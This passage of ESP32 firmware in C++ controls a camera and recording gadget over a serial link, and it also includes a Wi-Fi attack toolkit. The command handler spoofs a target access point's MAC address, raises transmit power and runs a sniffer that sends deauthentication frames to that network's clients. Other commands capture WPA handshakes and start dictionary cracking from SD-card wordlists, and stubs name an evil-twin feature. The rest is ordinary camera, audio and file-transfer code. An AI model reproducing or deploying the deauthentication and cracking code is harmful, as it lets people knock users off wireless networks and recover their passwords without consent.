            xiaoPerformDeauth(mac, deauthTarget);
            deauthPkts += 4;
        }
        
        // 2. Jika tujuan paket BUKAN target BSSID, dan bukan Multicast/Broadcast
        // Artinya: AP target membalas/ngirim data ke client (HP/Laptop) tertentu. Kita serang client tersebut.
        if ((hdr->dest[0] & 0x01) == 0 && memcmp(hdr->dest, deauthTarget, 6) != 0) {
            uint8_t mac[6];
            memcpy(mac, hdr->dest, 6);
            xiaoPerformDeauth(mac, deauthTarget);
            deauthPkts += 4;
        }
    }
}

void xiaoHandleWifiScan() {
  WiFi.mode(WIFI_STA);
  WiFi.disconnect(false, false);
  delay(120);

  int found = WiFi.scanNetworks();
  if (found > 0) {
    uint8_t limit = min<uint8_t>((uint8_t)found, 50);
    for (uint8_t i = 0; i < limit; i++) {
        uint8_t payload[64];
        memset(payload, 0, 64);
        
        payload[0] = i;
        payload[1] = WiFi.channel(i);
        payload[2] = (uint8_t)(WiFi.RSSI(i) * -1);
        memcpy(&payload[3], WiFi.BSSID(i), 6);
        payload[9] = (uint8_t)WiFi.encryptionType(i); // Tambahkan Info Encryption Type

        String ssidStr = WiFi.SSID(i);
        int cpylen = min((int)ssidStr.length(), 52); // Sisa 52 bytes max
        memcpy(&payload[10], ssidStr.c_str(), cpylen);
        
        sendPacket(PKT_WIFI_SCAN_RES, payload, 64);
        delay(10); // buffer
    }
  }
  WiFi.scanDelete();
}

static bool pollControlCommand(bool &captureRequested, bool &recStartRequested, bool &recStopRequested, bool &listRequested, bool &audioStartRequested, bool &audioStopRequested, bool &audioPauseRequested, bool &audioResumeRequested, bool &wifiScanRequested) {
  captureRequested = false;
  recStartRequested = false;
  recStopRequested = false;
  listRequested = false;
  audioStartRequested = false;
  audioStopRequested = false;
  audioPauseRequested = false;
  audioResumeRequested = false;
  wifiScanRequested = false;

  uint8_t type = 0;
  uint16_t len = 0;
  uint8_t payload[1024];
  if (!readPacket(type, payload, sizeof(payload), len, 3)) return false;

  if (type == PKT_WIFI_SCAN_CMD) {
    wifiScanRequested = true;
    return true;
  }
  
  if (type == PKT_DEAUTH_ATK_CMD) {
    if (len >= 10) {
      if (payload[9] == 1) { // Start
        memcpy(deauthTarget, &payload[0], 6);
        deauthChannel = payload[6];
        deauthReason = (uint16_t)payload[7] | ((uint16_t)payload[8] << 8);
        deauthActive = true;
        deauthPkts = 0;
        
        WiFi.mode(WIFI_AP_STA); // Mode AP_STA
        esp_wifi_stop();
        esp_wifi_set_mac(WIFI_IF_AP, deauthTarget); // WAJIB Spoof MAC WIFI_IF_AP ke Target BSSID saat WiFi mati
        esp_wifi_start();

        WiFi.softAP("ESP-Bypass", NULL, deauthChannel, 1); // Wajib agar WIFI_IF_AP "Aktif" !
        WiFi.disconnect(false, false); // JANGAN mematikan antena (parameternya false)
        delay(10);
        esp_wifi_set_ps(WIFI_PS_NONE); // Disable Power Save to prevent modem sleep!
        esp_wifi_set_max_tx_power(84); // FULL THROTTLE TX POWER! 21dBm max for ESP32S3!
        wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA };
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&xiaoDeauthSniffer);
        esp_wifi_set_channel(deauthChannel, WIFI_SECOND_CHAN_NONE);

      } else { // Stop
        deauthActive = false;
        esp_wifi_set_promiscuous_rx_cb(NULL);
        esp_wifi_set_promiscuous(false);
        WiFi.softAPdisconnect(true); // Matikan SoftAP By-pass
        WiFi.mode(WIFI_STA);
        WiFi.disconnect(false, true);
      }
    }
    return true;
  }

  // --- CRACKER COMMANDS ---
  if (type == PKT_CRACK_DICT_REQ) {
    // We will list the SD card root for .txt files in the loop to avoid blocking UART
    xiaoReportDict = true; 
    return true;
  }

  if (type == PKT_CRACK_CAP_START) {
    if (len >= 1) {
      bool isStart = (payload[0] == 1);
      if (isStart) {
        if (len < 9) {
          sendStatusText("WPA_CAP state=ERR bad_start_payload");
          return true;
        }
        memcpy(wpaTargetBssid, &payload[1], 6);
        uint8_t chan = payload[7];
        wpaCaptureChannel = chan;
        uint8_t ssidLen = payload[8];
        wpaTargetSsid = "";
        for (int i = 0; i < ssidLen; i++) {
          if (9 + i < len) wpaTargetSsid += (char)payload[9 + i];
        }
        
        wpaHandshakeFound = false;
        wpaEapolSize = 0;
        memset(wpaTargetStation, 0, sizeof(wpaTargetStation));
        wpaCapDataFrames = 0;
        wpaCapEapolFrames = 0;
        wpaCapSawTraffic = false;
        wpaCapSawM1 = false;
        wpaCapSawM2 = false;
        wpaCaptureActive = true;
        wpaLastInsightMs = 0;
        sendStatusText(String("WPA_CAP state=INIT ch=") + String((unsigned long)wpaCaptureChannel) + " data=0 eapol=0 m1=0 m2=0 hs=0");

        WiFi.mode(WIFI_AP_STA);
        esp_wifi_stop();
        esp_wifi_start();
        WiFi.softAP("ESP-Bypass", NULL, chan, 1);
        WiFi.disconnect(false, false);
        delay(10);
        esp_wifi_set_ps(WIFI_PS_NONE);
        wifi_promiscuous_filter_t filt = { .filter_mask = WIFI_PROMIS_FILTER_MASK_DATA | WIFI_PROMIS_FILTER_MASK_MGMT };
        esp_wifi_set_promiscuous_filter(&filt);
        esp_wifi_set_promiscuous(true);
        esp_wifi_set_promiscuous_rx_cb(&xiaoDeauthSniffer);
        esp_wifi_set_channel(chan, WIFI_SECOND_CHAN_NONE);

      } else {
        // Stop capture
        xiaoStopWpaCapture();
        sendStatusText(String("WPA_CAP state=STOP ch=") + String((unsigned long)wpaCaptureChannel) + " data=" + String((unsigned long)wpaCapDataFrames) + " eapol=" + String((unsigned long)wpaCapEapolFrames) + " m1=" + String(wpaCapSawM1 ? "1" : "0") + " m2=" + String(wpaCapSawM2 ? "1" : "0") + " hs=" + String(wpaHandshakeFound ? "1" : "0"));
      }
    }
    return true;
  }

  if (type == PKT_CRACK_RUN_START) {
    if (len >= 2) {
      bool isStart = (payload[0] == 1);
      if (isStart) {
        if (wpaCaptureActive) xiaoStopWpaCapture();
        if (wpaDictHandle) wpaDictHandle.close();
        wpaDictFile = "";
        for (int i = 1; i < len; i++) {
           wpaDictFile += (char)payload[i];
        }
        wpaCrackActive = true;
        wpaCrackChecked = 0; 
        wpaCrackPassword = "";
        wpaCrackDone = false;
        xiaoEnterCrackBoost();
      } else {
        if (wpaDictHandle) wpaDictHandle.close();
        wpaCrackActive = false;
        xiaoExitCrackBoost();
      }
    }
    return true;
  }
  if (type == PKT_LAN_SCAN_CMD) {
    // (Moved to Matrix natively)
    return true;
  }

  // --- FILE PULL LOGIC (MATRIX -> XIAO) ---
  if (type == PKT_FILE_PULL_REQ) {
    String filename = "";
    for(size_t i=0; i<len; i++) filename += (char)payload[i];
    
    if (pullActive && pullFile) pullFile.close();
    
    if (SD.exists(filename)) {
      pullFile = SD.open(filename, FILE_READ);
      if (pullFile) {
        pullActive = true;
        pullSeq = 0;
        uint32_t size = pullFile.size();
        uint8_t res[5];
        res[0] = 1; // ok
        memcpy(&res[1], &size, 4);
        sendPacket(PKT_FILE_PULL_RES, res, 5);
        
        // Immediately send chunk 0
        if (pullFile.available()) {
          uint8_t buf[240];
          buf[0] = pullSeq & 0xFF;
          buf[1] = (pullSeq >> 8) & 0xFF;
          size_t n = pullFile.read(&buf[2], 238);
          sendPacket(PKT_FILE_PULL_CHUNK, buf, n + 2);
        } else {
          pullActive = false;
          pullFile.close();
          uint8_t empty = 0;
          sendPacket(PKT_FILE_PULL_END, &empty, 1);
        }
      } else {
        uint8_t res[1] = {0};
        sendPacket(PKT_FILE_PULL_RES, res, 1);
      }
    } else {
      uint8_t res[1] = {0};
      sendPacket(PKT_FILE_PULL_RES, res, 1);
    }
    return true;
  }

  if (type == PKT_FILE_PULL_ACK) {
    if (pullActive && pullFile) {
      if (len >= 2) {
        uint16_t ackSeq = payload[0] | (payload[1] << 8);
        if (ackSeq == pullSeq) pullSeq++;
      } else {
        pullSeq++;
      }
      
      if (pullFile.available()) {
        uint8_t buf[240];
        buf[0] = pullSeq & 0xFF;
        buf[1] = (pullSeq >> 8) & 0xFF;
        size_t n = pullFile.read(&buf[2], 238);
        sendPacket(PKT_FILE_PULL_CHUNK, buf, n + 2);
      } else {
        pullActive = false;
        pullFile.close();
        uint8_t empty = 0;
        sendPacket(PKT_FILE_PULL_END, &empty, 1);
      }
    }
    return true;
  }
  // ----------------------------------------

  if (type == PKT_EVIL_TWIN_CMD) {
    // (Moved to Matrix natively)
    return true;
  }

  // -------------------------

  if (type != PKT_CMD || len < 1) return true;

  if (payload[0] == CMD_CAPTURE_3MP) {
    captureRequested = true;
    return true;
  }

  if (payload[0] == CMD_REC_START) {
    recStartRequested = true;
    return true;
  }

  if (payload[0] == CMD_REC_STOP) {
    recStopRequested = true;
    return true;
  }

  if (payload[0] == CMD_SD_LIST) {
    listRequested = true;
    return true;
  }

  if (payload[0] == CMD_AUDIO_REC_START) {
    audioStartRequested = true;
    return true;
  }

  if (payload[0] == CMD_AUDIO_REC_STOP) {
    audioStopRequested = true;
    return true;
  }

  if (payload[0] == CMD_AUDIO_REC_PAUSE) {
    audioPauseRequested = true;
    return true;
  }

  if (payload[0] == CMD_AUDIO_REC_RESUME) {
    audioResumeRequested = true;
    return true;
  }

  if (payload[0] == CMD_TIME_SET && len >= 5) {
    uint32_t ts =
      (uint32_t)payload[1] |
      ((uint32_t)payload[2] << 8) |
      ((uint32_t)payload[3] << 16) |
      ((uint32_t)payload[4] << 24);
    xiaoUnixBase = ts;
    xiaoUnixBaseMs = millis();
    return true;
  }

  if (payload[0] == CMD_FILE_PUSH_START && len >= 3) {
    uint8_t nameLen = payload[1];
    if ((uint16_t)(2 + nameLen + 4) <= len && nameLen > 0) {
      char nameBuf[64];
      size_t safeLen = (nameLen < sizeof(nameBuf) - 1) ? nameLen : (sizeof(nameBuf) - 1);
      memcpy(nameBuf, payload + 2, safeLen);
      nameBuf[safeLen] = '\0';
      String fn = String(nameBuf);
      fn.replace("..", "_");
      fn.replace("/", "_");
      fn.replace("\\", "_");
      if (fn.length() == 0) fn = String("file_") + xiaoTsTag() + ".bin";
      if (!SD.exists("/uploads")) SD.mkdir("/uploads");
      if (xiaoPushFile) xiaoPushFile.close();
      String p = String("/uploads/") + xiaoTsTag() + "_" + fn;
      xiaoPushFile = SD.open(p, FILE_WRITE);
      xiaoPushActive = (bool)xiaoPushFile;
      xiaoPushNextSeq = 0;
      xiaoPushBytes = 0;
      xiaoPushExpectedBytes =
        (uint32_t)payload[2 + nameLen + 0] |
        ((uint32_t)payload[2 + nameLen + 1] << 8) |
        ((uint32_t)payload[2 + nameLen + 2] << 16) |
        ((uint32_t)payload[2 + nameLen + 3] << 24);
      xiaoPushPath = p;
      if (xiaoPushActive) sendStatusText(String("PUSH start ") + p + " bytes=" + String((unsigned long)xiaoPushExpectedBytes));
      else sendStatusText("PUSH open fail");
    }
    return true;
  }

  if (payload[0] == CMD_FILE_PUSH_CHUNK && len >= 4) {
    if (!xiaoPushActive || !xiaoPushFile) return true;
    uint16_t seq = (uint16_t)payload[1] | ((uint16_t)payload[2] << 8);
    if (seq != xiaoPushNextSeq) {
      sendStatusText(String("PUSH seq mismatch exp=") + String(xiaoPushNextSeq) + " got=" + String(seq));
      if (xiaoPushFile) xiaoPushFile.close();
      if (xiaoPushPath.length() > 0 && SD.exists(xiaoPushPath)) SD.remove(xiaoPushPath);
      xiaoPushActive = false;
      xiaoPushNextSeq = 0;
      xiaoPushBytes = 0;
      xiaoPushExpectedBytes = 0;
      xiaoPushPath = "";
      return true;
    }
    size_t dataLen = (size_t)(len - 3);
    if (dataLen > 0) {
      size_t wr = xiaoPushFile.write(payload + 3, dataLen);
      if (wr == dataLen) {
        xiaoPushBytes += (uint32_t)dataLen;
        uint8_t ack[2] = {
          (uint8_t)(seq & 0xFF),
          (uint8_t)((seq >> 8) & 0xFF)
        };
        sendPacket(PKT_CAPTURE_ACK, ack, sizeof(ack));
        xiaoPushNextSeq++;
      } else {
        sendStatusText("PUSH write fail");
        if (xiaoPushFile) xiaoPushFile.close();
        if (xiaoPushPath.length() > 0 && SD.exists(xiaoPushPath)) SD.remove(xiaoPushPath);
        xiaoPushActive = false;
        xiaoPushNextSeq = 0;
        xiaoPushBytes = 0;
        xiaoPushExpectedBytes = 0;
        xiaoPushPath = "";
      }
    }
    return true;
  }

  if (payload[0] == CMD_FILE_PUSH_END) {
    if (xiaoPushFile) xiaoPushFile.close();
    if (xiaoPushActive) {
      if (xiaoPushExpectedBytes > 0 && xiaoPushBytes != xiaoPushExpectedBytes) {
        if (xiaoPushPath.length() > 0 && SD.exists(xiaoPushPath)) SD.remove(xiaoPushPath);
        sendStatusText(String("PUSH fail size exp=") + String((unsigned long)xiaoPushExpectedBytes) + " got=" + String((unsigned long)xiaoPushBytes));
      } else {
        sendStatusText(String("PUSH saved ") + String((unsigned long)xiaoPushBytes));
      }
    }
    xiaoPushActive = false;
    xiaoPushNextSeq = 0;
    xiaoPushBytes = 0;
    xiaoPushExpectedBytes = 0;
    xiaoPushPath = "";
    return true;
  }

  if (payload[0] == CMD_WEB_SERVER && len >= 2) {
    xiaoWebDesired = (payload[1] != 0);
    if (!xiaoWebDesired) {
      xiaoStopWebServer(true);
    } else {
      sendStatusText("XIAO web requested");
    }
    return true;
  }

  if (payload[0] == CMD_WIFI_CFG && len >= 3) {
    uint8_t ssidLen = payload[1];
    uint8_t passLen = payload[2];
    uint16_t needed = (uint16_t)(3 + ssidLen + passLen);
    if (needed <= len && ssidLen > 0) {
      char ssidBuf[65];
      size_t safeSsidLen = (ssidLen < sizeof(ssidBuf) - 1) ? ssidLen : (sizeof(ssidBuf) - 1);
      memcpy(ssidBuf, payload + 3, safeSsidLen);
      ssidBuf[safeSsidLen] = '\0';
      xiaoWifiSsid = String(ssidBuf);
      xiaoWifiPass = "";
      if (passLen > 0) {
        char passBuf[65];
        size_t safePassLen = (passLen < sizeof(passBuf) - 1) ? passLen : (sizeof(passBuf) - 1);
        memcpy(passBuf, payload + 3 + ssidLen, safePassLen);
        passBuf[safePassLen] = '\0';
        xiaoWifiPass = String(passBuf);
      }
      sendStatusText(String("XIAO wifi cfg ") + xiaoWifiSsid);
    } else {
      sendStatusText("XIAO wifi cfg bad");
    }
    return true;
  }

  if (payload[0] == CMD_SET_STREAM_CTRL && len >= 5) {
    cameraCtlFilter = payload[1] % 6;
    cameraCtlBrightness = (int8_t)payload[2] - 4;
    cameraCtlContrast = (int8_t)payload[3] - 4;
    cameraCtlSaturation = (int8_t)payload[4] - 4;
    applyImageControls();
    Serial.printf("ctrl fx=%u bri=%d con=%d sat=%d\n", cameraCtlFilter, cameraCtlBrightness, cameraCtlContrast, cameraCtlSaturation);
  }

  return true;
}

static bool waitCaptureAck(uint16_t seq, uint32_t timeoutMs) {
  uint32_t deadline = millis() + timeoutMs;
  while ((int32_t)(deadline - millis()) > 0) {
    uint8_t type = 0;
    uint16_t len = 0;
    uint8_t payload[16];
    if (!readPacket(type, payload, sizeof(payload), len, 8)) {
      continue;
    }
    if (type == PKT_CAPTURE_ACK && len >= 2) {
      uint16_t gotSeq = (uint16_t)payload[0] | (uint16_t)((uint16_t)payload[1] << 8);
      if (gotSeq == seq) return true;
    } else if (type == PKT_CMD && len >= 1 && payload[0] == CMD_CAPTURE_3MP) {
      // Ignore duplicate capture command while a capture transfer is in progress.
    }
  }
  return false;
}

static camera_fb_t *captureJpeg3mp(uint32_t timeoutMs) {
  uint32_t start = millis();
  // Throw away the first frames after mode switch so AWB/AE can settle.
  for (uint8_t i = 0; i < 3; i++) {
    camera_fb_t *tmp = esp_camera_fb_get();
    if (tmp) esp_camera_fb_return(tmp);
    delay(60);
  }

  camera_fb_t *best = nullptr;
  while ((millis() - start) < timeoutMs) {
    camera_fb_t *fb = esp_camera_fb_get();
    if (fb && fb->format == PIXFORMAT_JPEG && fb->len > 0) {
      if (best) esp_camera_fb_return(best);
      best = fb;
      // grab one more settled frame if time allows, usually improves color/exposure.
      if ((millis() - start) > (timeoutMs / 2)) break;
      delay(50);
      continue;
    }
    if (fb) esp_camera_fb_return(fb);
    delay(20);
  }
  return best;
}

static void sendCaptureResult(uint8_t status) {
  for (uint8_t i = 0; i < 3; i++) {
    sendPacket(PKT_CAPTURE_END, &status, 1);
    Serial1.flush();
    delay(3);
  }
}

static void runRemoteCapture3mp() {
  Serial.println("capture cmd: switching to 3MP JPEG");
  if (!switchCameraMode(true)) {
    Serial.println("capture fail: mode switch");
    sendCaptureResult(0);
    switchCameraMode(false);
    return;
  }

  delay(120);
  camera_fb_t *fb = captureJpeg3mp(5000);
  if (!fb) {
    Serial.println("capture fail: frame timeout");
    sendCaptureResult(0);
    switchCameraMode(false);
    return;
  }

  uint8_t startPayload[4] = {
    (uint8_t)(fb->len & 0xFF),
    (uint8_t)((fb->len >> 8) & 0xFF),
    (uint8_t)((fb->len >> 16) & 0xFF),
    (uint8_t)((fb->len >> 24) & 0xFF)
  };
  sendPacket(PKT_CAPTURE_START, startPayload, sizeof(startPayload));

  size_t pos = 0;
  uint16_t seq = 0;
  uint8_t chunkBuf[2 + CAPTURE_CHUNK];
  while (pos < fb->len) {
    uint16_t chunk = (uint16_t)min<size_t>(CAPTURE_CHUNK, fb->len - pos);
    chunkBuf[0] = (uint8_t)(seq & 0xFF);
    chunkBuf[1] = (uint8_t)((seq >> 8) & 0xFF);
    memcpy(chunkBuf + 2, fb->buf + pos, chunk);

    bool acked = false;
    for (uint8_t attempt = 0; attempt < 8; attempt++) {
      sendPacket(PKT_CAPTURE_CHUNK, chunkBuf, (uint16_t)(chunk + 2));
      if (waitCaptureAck(seq, 220)) {
        acked = true;
        break;
      }
      delay(4);
    }

    if (!acked) {
      Serial.println("capture fail: ack timeout");
      esp_camera_fb_return(fb);
      sendCaptureResult(0);
      switchCameraMode(false);
      return;
    }

    pos += chunk;
    seq++;
    delay(2);
  }

  sendCaptureResult(1);
  esp_camera_fb_return(fb);

  if (!switchCameraMode(false)) {
    Serial.println("stream restore failed, restarting...");
    delay(500);
    ESP.restart();
  }
  Serial.println("capture done, stream resumed");
}

static bool startRecording() {
  if (recordingActive) return true;
  if (!sdReady && !initSdCard()) return false;
  if (!micReady && !initMic()) return false;

  recBaseName = String("/rec_") + xiaoTsTag();
  if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
    String rawVideoPath = recBaseName + ".vraw";
    String rawAudioPath = recBaseName + ".araw";
    if (SD.exists(rawVideoPath)) SD.remove(rawVideoPath);
    if (SD.exists(rawAudioPath)) SD.remove(rawAudioPath);
    recRawVideoFile = SD.open(rawVideoPath, FILE_WRITE);
    recRawAudioFile = SD.open(rawAudioPath, FILE_WRITE);
    if (!recRawVideoFile || !recRawAudioFile) {
      if (recRawVideoFile) recRawVideoFile.close();
      if (recRawAudioFile) recRawAudioFile.close();
      sendStatusText("REC fail: raw open");
      return false;
    }
  } else {
    recAviFile = SD.open(recBaseName + ".avi", FILE_WRITE);
    if (!recAviFile) {
      sendStatusText("REC fail: SD open");
      return false;
    }

    if (!aviWriteHeader(recAviFile, REC_FPS)) {
      recAviFile.close();
      sendStatusText("REC fail: AVI header");
      return false;
    }
  }

  if (micReady) {
    // Drop stale buffered mic data so timeline starts from fresh audio.
    uint8_t flushBuf[256];
    uint32_t flushUntil = millis() + 40;
    while ((int32_t)(flushUntil - millis()) > 0) {
      size_t n = micI2S.readBytes((char *)flushBuf, sizeof(flushBuf));
      if (n == 0) break;
      delay(1);
    }
  }

  recAudioBytes = 0;
  recAudioPacedBytes = 0;
  recVideoFrames = 0;
  recRawAudioBytes = 0;
  recRawVideoFrames = 0;
  recLastRawFrameValid = false;
  recLastAudioSample = 0;
  recStartMs = millis();
  recLastStatusMs = millis();
  recNextVideoMs = millis();
  recLastFreshFrameMs = recStartMs;
  recLastFrameSig = 0;
  recSameFrameCount = 0;
  recNeedCameraRecover = false;
  recordingActive = true;
  sendStatusText(REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS ? "REC started(raw)" : "REC started");
  return true;
}

static void stopRecording(bool notify = true) {
  if (!recordingActive) return;
  uint32_t stopMs = millis();
  uint32_t elapsedMs = stopMs - recStartMs;

  if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
    // Tail flush: keep raw audio/video timeline up to exact stop timestamp.
    if (recRawAudioFile) {
      uint32_t expectedAudioBytes = (uint32_t)(((uint64_t)elapsedMs * REC_AUDIO_RATE * 2ULL) / 1000ULL);
      expectedAudioBytes &= ~((uint32_t)1);
      if (expectedAudioBytes > recRawAudioBytes) {
        uint32_t remaining = expectedAudioBytes - recRawAudioBytes;
        int16_t padBuf[256];
        for (size_t i = 0; i < 256; i++) padBuf[i] = recLastAudioSample;
        while (remaining >= 2) {
          uint32_t take = remaining;
          if (take > sizeof(padBuf)) take = sizeof(padBuf);
          take &= ~((uint32_t)1);
          if (take < 2) break;
          if (recRawAudioFile.write((const uint8_t *)padBuf, take) != take) break;
          recRawAudioBytes += take;
          remaining -= take;
        }
      }
    }

    if (recRawVideoFile && recLastRawFrameValid) {
      uint32_t expectedFrames = (uint32_t)((((uint64_t)elapsedMs * REC_FPS) + 999ULL) / 1000ULL);
      uint32_t maxPadFrames = recRawVideoFrames + 2;
      if (expectedFrames > maxPadFrames) expectedFrames = maxPadFrames;
      while (recRawVideoFrames < expectedFrames) {
        size_t wr = recRawVideoFile.write(recLastRawFrame, sizeof(recLastRawFrame));
        if (wr != sizeof(recLastRawFrame)) break;
        recRawVideoFrames++;
      }
    }

    recordingActive = false;
    if (recRawVideoFile) recRawVideoFile.close();
    if (recRawAudioFile) recRawAudioFile.close();
    if (elapsedMs > 0) {
      uint32_t fpsX100 = (recRawVideoFrames * 100000UL) / elapsedMs;
      sendStatusText(String("REC raw done F") + String(recRawVideoFrames) + " A" + String((unsigned long)recRawAudioBytes) + " FPS " + String(fpsX100 / 100) + "." + String(fpsX100 % 100));
    }
    sendStatusText("REC processing...");
    bool ok = buildAviFromRawFiles();
    if (!ok) {
      sendStatusText("REC fail: mux");
      return;
    }
  } else {
    recordingActive = false;
    if (recAviFile) {
      aviFinalize();
      recAviFile.close();
    }
  }

  if (notify) {
    String msg = String("REC saved ") + recBaseName + ".avi";
    sendStatusText(msg);
  }

  recNeedCameraRecover = false;
  recSameFrameCount = 0;
}

static void recordingStep(camera_fb_t *fb) {
  if (!recordingActive) return;
  if (!REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS && !recAviFile) {
    stopRecording(false);
    sendStatusText("REC fail: file closed");
    return;
  }
  if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS && (!recRawVideoFile || !recRawAudioFile)) {
    stopRecording(false);
    sendStatusText("REC fail: raw closed");
    return;
  }

  if (recNextVideoMs == 0) recNextVideoMs = millis();

  static uint8_t bgrFrame[CAM_W * CAM_H * 3];
  static uint8_t lastBgrFrame[CAM_W * CAM_H * 3];
  static uint8_t lastRawFrame[CAM_W * CAM_H * 2];
  static bool lastRawFrameValid = false;
  static bool lastFrameValid = false;
  bool haveFrame = false;
  if (fb && fb->format == PIXFORMAT_RGB565 && fb->len == (size_t)(CAM_W * CAM_H * 2)) {
    if (!REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
      for (size_t i = 0, o = 0; i < fb->len; i += 2, o += 3) {
        uint16_t p = (uint16_t)((uint16_t)fb->buf[i] << 8) | (uint16_t)fb->buf[i + 1];
        uint8_t r = (uint8_t)(((p >> 11) & 0x1F) * 255 / 31);
        uint8_t g = (uint8_t)(((p >> 5) & 0x3F) * 255 / 63);
        uint8_t b = (uint8_t)((p & 0x1F) * 255 / 31);
        bgrFrame[o + 0] = b;
        bgrFrame[o + 1] = g;
        bgrFrame[o + 2] = r;
      }
      memcpy(lastBgrFrame, bgrFrame, sizeof(bgrFrame));
      lastFrameValid = true;
    }
    if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
      memcpy(lastRawFrame, fb->buf, sizeof(lastRawFrame));
      memcpy(recLastRawFrame, fb->buf, sizeof(recLastRawFrame));
      recLastRawFrameValid = true;
      lastRawFrameValid = true;
    }
    haveFrame = true;

    uint32_t sig = frameSig32(fb->buf, fb->len);
    if (sig == recLastFrameSig) {
      if (recSameFrameCount < 0xFFFF) recSameFrameCount++;
    } else {
      recLastFrameSig = sig;
      recSameFrameCount = 0;
    }

    recLastFreshFrameMs = millis();
  } else {
    if ((int32_t)(millis() - recLastFreshFrameMs) > (int32_t)REC_FRAME_STALL_MS) {
      recNeedCameraRecover = true;
    }
  }

  uint32_t now = millis();
  if ((int32_t)(now - recNextVideoMs) > (int32_t)(REC_VIDEO_INTERVAL_MS * REC_MAX_VIDEO_CATCHUP_STEPS)) {
    recNextVideoMs = now;
  }

  uint8_t steps = 0;
  while ((int32_t)(now - recNextVideoMs) >= 0 && steps < 8) {
    if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
      const uint8_t *src = nullptr;
      if (haveFrame) src = fb ? fb->buf : nullptr;
      else if (lastRawFrameValid) src = lastRawFrame;

      if (src) {
        size_t wr = recRawVideoFile.write(src, CAM_W * CAM_H * 2);
        if (wr != (size_t)(CAM_W * CAM_H * 2)) {
          stopRecording(false);
          sendStatusText("REC fail: raw video write");
          return;
        }
        recRawVideoFrames++;
      }
    } else {
      if (haveFrame) {
        aviWriteChunk("00db", bgrFrame, (uint32_t)(CAM_W * CAM_H * 3));
        recVideoFrames++;
      } else if (lastFrameValid) {
        // Keep AVI timeline stable when camera misses a frame.
        aviWriteChunk("00db", lastBgrFrame, (uint32_t)(CAM_W * CAM_H * 3));
        recVideoFrames++;
      }
    }
    recNextVideoMs += REC_VIDEO_INTERVAL_MS;
    steps++;
    now = millis();
  }

  if (recSameFrameCount > (uint16_t)(REC_FPS * 3U)) {
    recNeedCameraRecover = true;
  }

  if (micReady) {
    static int32_t dc = 0;
    static int32_t lp = 0;
    static uint8_t audioChunk[1536];

    uint32_t elapsedMs = now - recStartMs;
    uint32_t expectedBytes = (uint32_t)(((uint64_t)elapsedMs * REC_AUDIO_RATE * 2ULL) / 1000ULL);
    uint32_t needBytes = (expectedBytes > recAudioPacedBytes) ? (expectedBytes - recAudioPacedBytes) : 0;
    if (needBytes > REC_AUDIO_MAX_BYTES_PER_LOOP) needBytes = REC_AUDIO_MAX_BYTES_PER_LOOP;

    while (needBytes >= 2) {
      uint32_t chunkNeed = needBytes;
      if (chunkNeed > sizeof(audioChunk)) chunkNeed = sizeof(audioChunk);
      chunkNeed &= ~((uint32_t)1);
      if (chunkNeed < 2) break;

      size_t gotTotal = 0;
      uint32_t chunkMs = (uint32_t)(((uint64_t)chunkNeed * 1000ULL) / (REC_AUDIO_RATE * 2ULL));
      if (chunkMs < 4) chunkMs = 4;
      if (chunkMs > 24) chunkMs = 24;
      uint32_t readDeadline = millis() + chunkMs + 18;
      while (gotTotal < chunkNeed && (int32_t)(readDeadline - millis()) > 0) {
        size_t ask = chunkNeed - gotTotal;
        if (ask > 512) ask = 512;
        size_t got = micI2S.readBytes((char *)(audioChunk + gotTotal), ask);
        if (got == 0) {
          delay(1);
          continue;
        }
        gotTotal += got;
      }

      size_t gotAligned = gotTotal & ~((size_t)1);
      if (REC_AUDIO_ENABLE_POSTFX && gotAligned >= 2) {
        applyAudioPostFx(audioChunk, gotAligned, dc, lp);
      }

      if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
        // In deferred mode keep only real captured samples to avoid choppy artifacts.
        size_t writeBytes = gotAligned;
        if (writeBytes >= 2) {
          recLastAudioSample = readSample16(audioChunk + writeBytes - 2);
        }
        if (writeBytes >= 2 && recRawAudioFile.write(audioChunk, writeBytes) != writeBytes) {
          stopRecording(false);
          sendStatusText("REC fail: raw audio write");
          return;
        }
        recRawAudioBytes += (uint32_t)writeBytes;
        recAudioPacedBytes += (uint32_t)writeBytes;
        if (chunkNeed > writeBytes) break;
      } else {
        size_t writeBytes = chunkNeed;
        if (gotAligned < writeBytes) {
          int16_t padSample = 0;
          if (gotAligned >= 2) {
            padSample = readSample16(audioChunk + gotAligned - 2);
          }
          fillAudioPadding(audioChunk + gotAligned, writeBytes - gotAligned, padSample);
        }
        aviWriteChunk("01wb", audioChunk, (uint32_t)writeBytes);
        recAudioBytes += (uint32_t)writeBytes;
        recAudioPacedBytes += (uint32_t)writeBytes;
      }
      needBytes = (expectedBytes > recAudioPacedBytes) ? (expectedBytes - recAudioPacedBytes) : 0;
      if (needBytes > REC_AUDIO_MAX_BYTES_PER_LOOP) needBytes = REC_AUDIO_MAX_BYTES_PER_LOOP;
    }
  }

  if (millis() - recLastStatusMs > 1000) {
    recLastStatusMs = millis();
    if (REC_DEFER_VIDEO_CONVERT_TO_POSTPROCESS) {
      sendStatusText(String("REC(raw) ") + (unsigned long)((millis() - recStartMs) / 1000) + "s F" + String(recRawVideoFrames) + " A" + String((unsigned long)recRawAudioBytes));
    } else {
      sendStatusText(String("REC ") + (unsigned long)((millis() - recStartMs) / 1000) + "s F" + String(recVideoFrames) + " A" + String((unsigned long)recAudioBytes));
    }
  }

  if (millis() - recStartMs > REC_MAX_MS) {
    stopRecording(true);
  }
}

static void maybeRecoverRecordingCamera() {
  if (!recordingActive || !recNeedCameraRecover) return;
  uint32_t now = millis();
  if ((int32_t)(now - recLastCameraRecoverMs) < (int32_t)REC_CAMERA_REINIT_COOLDOWN_MS) return;

  recLastCameraRecoverMs = now;
  recNeedCameraRecover = false;
  sendStatusText("REC warn: camera stall, reinit");

  if (!switchCameraMode(false, false)) {
    sendStatusText("REC fail: cam reinit");
    return;
  }

  recLastFreshFrameMs = millis();
  recSameFrameCount = 0;
